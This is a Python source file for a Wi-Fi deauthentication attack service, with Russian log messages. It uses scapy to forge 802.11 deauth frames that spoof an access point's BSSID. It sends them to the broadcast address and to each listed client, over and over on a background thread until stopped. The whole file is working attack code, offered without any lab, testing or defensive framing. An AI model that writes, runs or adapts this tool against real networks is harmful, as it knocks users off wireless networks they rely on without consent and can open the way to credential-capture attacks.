import threading
from typing import Callable, Iterable, List, Optional

from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore


class DeauthService:
    def __init__(self, interface: str, log_callback: Optional[Callable[[str], None]] = None) -> None:
        self.interface = interface
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._log = log_callback

    def start(self, bssid: str, clients: Iterable[str], packets_per_client: int, interval: float) -> None:
        client_list = [client for client in clients if client]
        if not client_list:
            raise ValueError("Нет клиентов для деаутентификации")
        if packets_per_client <= 0:
            raise ValueError("Количество пакетов должно быть больше 0")
        if self._thread and self._thread.is_alive():
            self.stop()
        self._stop_event.clear()
        if self._log:
            self._log(
                f"Старт deauth: BSSID {bssid}, клиентов {len(client_list)}, пакетов {packets_per_client}, интервал {max(interval, 0.0):.2f} с"
            )
        self._thread = threading.Thread(
            target=self._run,
            args=(bssid, client_list, packets_per_client, max(interval, 0.0)),
            daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2)
        self._thread = None
        if self._log:
            self._log("Остановка deauth-потока")

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def _run(self, bssid: str, clients: List[str], packets: int, interval: float) -> None:
        broadcast_frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        frames = [RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7) for client in clients]
        cycle = 0
        total_sent = 0
        try:
            while not self._stop_event.is_set():
                cycle += 1
                sendp(broadcast_frame, iface=self.interface, count=packets, inter=0.01, verbose=False)
                broadcast_sent = packets
                targeted_sent = 0
                for frame in frames:
                    if self._stop_event.is_set():
                        break
                    sendp(frame, iface=self.interface, count=packets, inter=0.01, verbose=False)
                    targeted_sent += packets
                wait_interval = 0.1 if interval <= 0 else interval
                total_sent += broadcast_sent + targeted_sent
                if self._log:
                    self._log(
                        f"Deauth цикл {cycle}: broadcast {broadcast_sent} пак., клиенты {targeted_sent} пак. (итого {total_sent})"
                    )
                if self._stop_event.wait(wait_interval):
                    break
        finally:
            self._stop_event.clear()
